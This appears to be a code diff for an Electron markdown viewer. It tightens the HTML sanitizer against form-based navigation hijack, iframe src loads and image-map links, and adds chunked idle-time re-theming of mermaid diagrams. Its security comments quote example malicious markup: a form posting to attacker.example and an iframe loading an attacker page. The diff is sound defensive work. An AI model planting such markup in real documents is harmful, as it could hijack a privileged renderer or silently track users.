@@ -125,7 +125,27 @@ const SANITIZE_CONFIG = {
   ADD_ATTR: [
     'target', 'style', 'class', 'id', 'sandbox', 'srcdoc',
     'data-note-id', 'data-note-title', 'data-note-content', 'data-note-color'
-  ]
+  ],
+  // DOMPurify allows <form> and its `action` by default. In a web page that is
+  // harmless; here the main window runs with nodeIntegration, so a document
+  // containing
+  //   <form action="https://attacker.example/pwn.html"><button>View</button></form>
+  // is one click from replacing the Node-privileged renderer with an
+  // attacker-controlled page. The click handler only intercepts links, so form
+  // submission bypasses it entirely.
+  //
+  // Honest accounting of who does what here: FORBID_TAGS: ['form'] is the
+  // load-bearing line. `action` only exists on <form>, so it goes with the tag,
+  // and DOMPurify already strips `formaction` from <button>/<input> unaided -
+  // both were measured. FORBID_ATTR is therefore forward-defence: it keeps a
+  // future edit that re-adds 'form' to ADD_TAGS from quietly reopening this.
+  //
+  // This is defence in depth, not a complete control: the sanitizer cannot see
+  // a navigation the DOM never expressed (window.open, meta refresh, an @@@html
+  // frame relocating itself), which is why main.js also denies navigation on
+  // the main window. Neither layer is sufficient alone. (SEC-11)
+  FORBID_TAGS: ['form'],
+  FORBID_ATTR: ['action', 'formaction']
 };
 
 // DOMPurify's default URI allowlist rejects Windows drive paths and file://
@@ -177,6 +197,15 @@ function installSanitizerHooks() {
   DOMPurify.addHook('afterSanitizeAttributes', (node) => {
     if (node.tagName === 'IFRAME') {
       node.setAttribute('sandbox', 'allow-scripts');
+      // The only iframe this app intends to produce is the @@@html block, which
+      // is built from `srcdoc`. A `src` therefore never comes from us - and
+      // DOMPurify keeps it, because `src` is allowed by default and `iframe` is
+      // in ADD_TAGS. Left alone, `<iframe src="https://attacker/">` in ordinary
+      // markdown fetches and runs a remote page inside the main window with no
+      // click at all: a silent IP/User-Agent beacon at minimum. main.js also
+      // denies subframe navigation, which blocks the load, but the element
+      // should not exist in the first place. (SEC-11)
+      node.removeAttribute('src');
     }
   });
 
@@ -1454,13 +1483,17 @@ function loadDarkModePreference() {
 // mutex for all of them: every mermaid.run() and every cache write in this file
 // goes through it, so the last requested state is always the one that wins.
 //
-// Because work is serialised, a superseded update cannot exist, so there is
-// deliberately no generation/epoch token - it could never fire.
+// Because work is serialised, two *queued* jobs cannot overlap. The deferred
+// catch-up pass added for PERF-07 runs in later jobs though, so a superseded
+// update CAN now exist: a second theme toggle must abandon the first one's
+// remaining chunks. `mermaidRunSeq` is that generation token - a chunk whose
+// seq is stale renders nothing and writes nothing to the cache.
 //
 // Callers must not nest queueMermaidWork() inside queued work: the inner call
 // would wait on the outer one and deadlock.
 let mermaidWorkQueue = Promise.resolve();
 let mermaidRunSeq = 0;
+let mermaidNodeIdSeq = 0;
 
 function queueMermaidWork(fn) {
   const run = () => fn();
@@ -1473,6 +1506,135 @@ function updateMermaidTheme(isDark) {
   return queueMermaidWork(() => applyMermaidTheme(isDark));
 }
 
+// PERF-07. Re-theming every diagram in one synchronous batch cost 431.6ms on a
+// 20-diagram document, all of it before the first repaint - the toggle felt
+// stuck. Diagrams the user cannot see are re-themed afterwards, in small chunks
+// during idle time, so the visible result lands immediately.
+//
+// Off-screen nodes are deliberately left showing their old SVG until their
+// chunk runs. Restoring `data-mermaid-src` into them up front (what the single
+// batch did) would replace every diagram in the document with raw source text
+// for the duration of the pass - correct, but far uglier than a stale colour.
+const MERMAID_VISIBLE_MARGIN_FACTOR = 1; // one extra viewport above and below
+const MERMAID_CATCHUP_CHUNK = 4;
+// requestIdleCallback fires when the main thread is free, or at this deadline.
+// Measured on a 20-diagram document: the whole catch-up tail is ~500ms at 100,
+// ~1.4s at 250. The user cannot see the difference in the toggle itself, but a
+// shorter tail means less time in which scrolling down could reveal a diagram
+// still wearing the old theme.
+const MERMAID_CATCHUP_TIMEOUT_MS = 100;
+
+let mermaidCatchUpHandle = null;
+let mermaidSettled = Promise.resolve();
+let mermaidSettleResolve = null;
+
+// Test/observability seam: resolves when no deferred re-theme work is pending.
+// Without it a caller cannot tell "all diagrams are themed" from "the visible
+// ones are", which is exactly the distinction PERF-07 introduces.
+function whenMermaidSettled() {
+  return mermaidSettled;
+}
+
+function markMermaidBusy() {
+  if (!mermaidSettleResolve) {
+    mermaidSettled = new Promise((r) => {
+      mermaidSettleResolve = r;
+    });
+  }
+}
+
+// Only the current generation may declare the world settled; an abandoned
+// chunk chain must stay silent or it would resolve the promise the *new*
+// toggle is still working behind.
+function markMermaidSettled(seq) {
+  if (seq !== mermaidRunSeq) return;
+  if (mermaidSettleResolve) {
+    mermaidSettleResolve();
+    mermaidSettleResolve = null;
+  }
+}
+
+function isMermaidNodeVisible(el) {
+  const rect = el.getBoundingClientRect();
+  if (rect.width === 0 && rect.height === 0) return false;
+  const margin = window.innerHeight * MERMAID_VISIBLE_MARGIN_FACTOR;
+  return rect.bottom > -margin && rect.top < window.innerHeight + margin;
+}
+
+// Renders one batch of nodes at the given generation. Returns the number of
+// nodes actually handed to mermaid.
+async function renderMermaidBatch(nodes, seq) {
+  if (seq !== mermaidRunSeq || !window.mermaid) return 0;
+
+  const toRender = [];
+  for (const el of nodes) {
+    // A render or tab switch between chunks detaches the old nodes.
+    if (!el.isConnected) continue;
+    const src = el.dataset.mermaidSrc;
+    if (!src) continue;
+    el.textContent = src;
+    el.removeAttribute('data-processed');
+    el.id = `mermaid-${seq}-${mermaidNodeIdSeq++}`;
+    toRender.push(el);
+  }
+  if (toRender.length === 0) return 0;
+
+  try {
+    await mermaid.run({ nodes: toRender, suppressErrors: false });
+    // A newer toggle may have landed while mermaid was working; its SVGs are
+    // the wrong colour now, so they must not enter the cache.
+    if (seq !== mermaidRunSeq) return toRender.length;
+    toRender.forEach((el) => {
+      if (el.dataset.mermaidSrc && el.querySelector('svg')) {
+        mermaidSvgCache.set(el.dataset.mermaidSrc, el.innerHTML);
+      }
+    });
+  } catch (e) {
+    console.warn('Mermaid theme update failed, falling back to full re-render:', e);
+    if (seq === mermaidRunSeq && originalMarkdown) renderMarkdown(getActiveMarkdown());
+  }
+  return toRender.length;
+}
+
+function scheduleMermaidCatchUp(seq, initialPending) {
+  let pending = initialPending;
+  if (mermaidCatchUpHandle !== null) {
+    cancelIdleCallback(mermaidCatchUpHandle);
+    mermaidCatchUpHandle = null;
+  }
+
+  const step = () => {
+    mermaidCatchUpHandle = null;
+    if (seq !== mermaidRunSeq) return; // abandoned; the new generation owns the settle
+    // Re-check visibility each time rather than keeping the original order: if
+    // the user scrolled during the catch-up, whatever is now on screen is what
+    // they would notice still wearing the old theme.
+    const nowVisible = [];
+    const rest = [];
+    for (const el of pending) {
+      (isMermaidNodeVisible(el) ? nowVisible : rest).push(el);
+    }
+    pending = nowVisible.concat(rest);
+    const chunk = pending.splice(0, MERMAID_CATCHUP_CHUNK);
+    // Queued rather than run inline so it still shares the mutex with renders
+    // and the insert/edit-diagram commands.
+    queueMermaidWork(() => renderMermaidBatch(chunk, seq)).then(() => {
+      if (seq !== mermaidRunSeq) return;
+      if (pending.length === 0) {
+        markMermaidSettled(seq);
+        return;
+      }
+      mermaidCatchUpHandle = requestIdleCallback(step, {
+        timeout: MERMAID_CATCHUP_TIMEOUT_MS,
+      });
+    });
+  };
+
+  mermaidCatchUpHandle = requestIdleCallback(step, {
+    timeout: MERMAID_CATCHUP_TIMEOUT_MS,
+  });
+}
+
 async function applyMermaidTheme(isDark) {
   const seq = ++mermaidRunSeq;
 
@@ -1481,37 +1643,37 @@ async function applyMermaidTheme(isDark) {
   // diagram must still come up in this theme - ensureMermaid() applies it.
   mermaidDesiredDark = isDark;
   mermaidSvgCache.clear(); // SVG colours are baked into the SVG, must re-render
-  if (!window.mermaid) return;
+  if (!window.mermaid) {
+    markMermaidSettled(seq);
+    return;
+  }
 
   mermaid.initialize(getMermaidConfig(isDark));
 
-  const mermaidElements = viewer.querySelectorAll('.mermaid');
-  if (mermaidElements.length === 0) return;
-
-  // Restore source text into each element so mermaid can re-render with new theme colors
-  const toRender = [];
-  mermaidElements.forEach((el, index) => {
-    const src = el.dataset.mermaidSrc;
-    if (!src) return;
-    el.textContent = src;
-    el.removeAttribute('data-processed');
-    el.id = `mermaid-${seq}-${index}`;
-    toRender.push(el);
-  });
-
-  if (toRender.length === 0) return;
-
-  try {
-    await mermaid.run({ nodes: toRender, suppressErrors: false });
-    toRender.forEach(el => {
-      if (el.dataset.mermaidSrc && el.querySelector('svg')) {
-        mermaidSvgCache.set(el.dataset.mermaidSrc, el.innerHTML);
-      }
-    });
-  } catch (e) {
-    console.warn('Mermaid theme update failed, falling back to full re-render:', e);
-    if (originalMarkdown) renderMarkdown(getActiveMarkdown());
+  const mermaidElements = Array.from(viewer.querySelectorAll('.mermaid'));
+  if (mermaidElements.length === 0) {
+    markMermaidSettled(seq);
+    return;
   }
+
+  const visible = [];
+  const deferred = [];
+  for (const el of mermaidElements) {
+    (isMermaidNodeVisible(el) ? visible : deferred).push(el);
+  }
+
+  // Claim the settle promise before any await, so a caller that starts waiting
+  // during the visible batch cannot observe a stale resolved promise.
+  if (deferred.length > 0) markMermaidBusy();
+
+  await renderMermaidBatch(visible, seq);
+
+  if (seq !== mermaidRunSeq) return; // superseded while mermaid was working
+  if (deferred.length === 0) {
+    markMermaidSettled(seq);
+    return;
+  }
+  scheduleMermaidCatchUp(seq, deferred);
 }
 
 /**
@@ -1736,8 +1898,15 @@ const isNetworkPath = (p) => /^(\\\\|\/\/)/.test(p);
 
 // Handle links in rendered markdown
 viewer.addEventListener('click', (e) => {
-  // Find the closest anchor tag (in case click was on child element)
-  const link = e.target.closest('a');
+  // Find the closest anchor tag (in case click was on child element).
+  //
+  // `area` is included because DOMPurify keeps `<map><area href>` and an image
+  // map is a hyperlink by any other name. Matching only `a` left it to
+  // Chromium's default follow, which meant it bypassed the external-link
+  // routing and the SEC-12 local-file policy alike and relied entirely on
+  // main.js denying the navigation - i.e. it "worked" by being broken. Routed
+  // here it obeys exactly the same rules as every other link. (SEC-11)
+  const link = e.target.closest('a, area');
   if (link && link.href) {
     const url = link.href;
 
